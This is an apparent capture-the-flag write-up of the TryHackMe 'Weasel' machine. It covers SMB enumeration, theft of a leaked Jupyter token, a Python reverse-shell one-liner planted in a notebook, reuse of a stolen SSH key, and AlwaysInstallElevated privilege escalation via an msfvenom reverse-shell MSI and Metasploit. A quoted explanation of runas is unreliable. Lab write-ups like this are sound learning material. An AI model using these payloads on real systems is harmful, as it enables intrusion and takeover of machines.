## Enumeration:

I began the enumeration process by conducting a quick rustscan to scan for open ports and services on the target host. The scan revealed 15 open ports:

```bash
sudo rustscan -a 10.10.165.102  -- -sC -sV -vv -oN weasel_nmap
```

```

From the port scan results, I made several observations:

```
- SMBv2 is enabled, but message signing is not enforced.
- RDP is enabled on port 3389, and the target name is set as "DEV-DATASCI-JUP".
- Port 5985 is open, indicating that PowerShell remoting is enabled.
- Port 8888 is open and running TornadoServer/6.0.3, which is hosting Jupyter notebook.
```

### SMB Enumeration:

With SMB enabled, I proceeded to enumerate the network shares available to me. I utilized SMBmap to list all the shares:

```bash
smbmap -H weasel.thm -u RandomUser
```
I discovered that I had both Read and Write access to the "datasci-team" share, as well as Read access to the IPC$ share.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/0b11cea9-cf6e-48e2-b30b-1925210a35f8)

Further exploring the "datasci-team" share, I found multiple files present within it. To list these files, I used smbmap:
```bash
smbmap -R datasci-team -H weasel.thm -u DoesNotExist
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/dd41e754-5ae5-4ddb-89cc-4848a4a26759)

Using Smbclient, I established a connection and downloaded all the files to my local system:

```bash
smbclient \\\\weasel.thm\\datasci-team -U "DoesNotExist"

smb: \> prompt off #to turn off warnings
smb: \> recurse on #to enable recursive mode
smb: \> mget * # to download all files from the current file path
```

After downloading all the files, I thoroughly examined them and came across a Jupyter-token inside one of the files.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/2af6f790-3a09-4a3f-926d-f87e2cd0ef65)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial Access:

Based on the port scan results, I knew that port 8888 was running a Tornado server hosting a Jupyter notebook. I accessed the server and discovered an option to log in using a Jupyter token:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b5e2db75-db1b-4584-ac65-29562b8e43ee)

Using the Jupyter token obtained during the SMB scan, I successfully logged into the server:
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/485629a3-b49a-4645-b962-2500e3af6e86)

Upon logging in, I found the same files that I had observed in the "**datasci-team**" share. I opened the "weasel.ipynb" file, which was a Machine Learning file, and examined its contents:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/316183bd-3700-45f2-b293-3780eebd377b)

I discovered that the file executed Python modules and allowed for the inclusion of custom modules. Taking advantage of this, I added a Python reverse shell one-liner to the file:
```python3
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

After running the code, I quickly received a shell back to my netcat listener as the "dev-datasci" user. (pwn3d!ðŸ™‚)

### User Access:

After gaining initial access as the "dev-datasci" user, I searched for other users within the machine but did not find any. I examined the running processes and noticed there were very few. Initially, I suspected that I might be inside a Docker container, but upon further investigation, I discovered that I was actually inside a Windows machine running within the Windows Subsystem for Linux (WSL):

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4a4b80e1-7c6e-4bfb-a4d2-15a86ea02bd4)
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/49e57493-30ca-45a7-adb0-c5d9467ef58f)

During manual enumeration, I checked the home directory of the user and discovered a file named "dev-datasci-lowpriv_id_ed25519," which contained the private SSH key:

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/3880ef50-322a-4a68-89ad-904361f04f73)

I copied the key to my local machine, renamed it as "id_rsa," modified the permissions to "chmod 600" in order to use it for SSH login, and then performed the SSH login using the user "dev-datasci-lowpriv":

```bash
ssh -i id_rsa dev-datasci-lowpriv@weasel.thm
```

I successfully logged in and obtained a command prompt as the user "dev-datasci-lowpriv." (pwn3d!ðŸ™‚)

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6b6ec7de-688f-4492-9774-211d025a1913)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

After gaining access to the low privilege user and retrieving the user flag, I began searching for potential privilege escalation vectors. I executed WinPEAS to check for all possible vectors and discovered some interesting results related to the "AlwaysInstallElevated" privilege. I found that "AlwaysInstallElevated" was set to '1' in both HKLM (HKEY_LOCAL_MACHINE) and HKCU (HKEY_CURRENT_USER) registries.

![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1847e73d-72f2-4c3c-9eb2-be7bc8ce9f30)

Upon further research on the [hacktrickz website](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) regarding how to exploit this vulnerability for privilege escalation, I discovered that any user with privileges can install ".msi" files with SYSTEM privileges.

Following the provided steps, I created an ".msi" file using 'msfvenom':

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f msi -o update.msi
```
I uploaded the "update.msi" file to the Windows system and executed it:

```
msiexec /quiet /qn /i update.msi
```

However, I did not receive a reverse shell back to my Kali machine for some reason. While investigating why my exploit was not working, I came across a blog that provided some insights:

```
When you run msiexec directly in your SSH session, it uses the current user's privileges and permissions to execute the command. If the user account "dev-datasci-lowpriv" does not have sufficient privileges or lacks necessary permissions, it could result in the failure of the msiexec command.

However, when you use runas /user:dev-datasci-lowpriv to execute msiexec, it runs the command under a different process with the specified user's credentials. This effectively elevates the privileges of the command, potentially bypassing any restrictions or permission issues associated with the current user account.
```
So, I can execute "msiexec" using the "runas" command, but I do not have the current user's credentials.

### Metasploit:

Next, I utilized Metasploit to escalate my privileges. Firstly, I created a session using Metasploit and then migrated myself to another process with higher privileges.

The reason for migration was that when I checked my current privilege level, I discovered that I was running as a low-level user in session 0.
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/58049932-d767-4378-85d6-147329a4d40f)

After successfully migrating, I obtained a higher privilege level in session 1.
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1a1f5905-8429-4bf9-8bf1-9df1105b3a84)

With the elevated privileges, I proceeded to search for a suitable module in Metasploit to exploit the "AlwaysInstallElevated" vulnerability. I located the module under:

```bash
exploit/windows/local/always_install_elevated
```
![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b6de0588-9ec4-4afc-9a56-4a603493bc12)

I utilized the module, modified the variables accordingly, and successfully obtained a session as "NT AUTHORITY\SYSTEM," granting me root privileges. Consequently, I was able to retrieve the root flag as well. (pwn3d!ðŸ™‚)
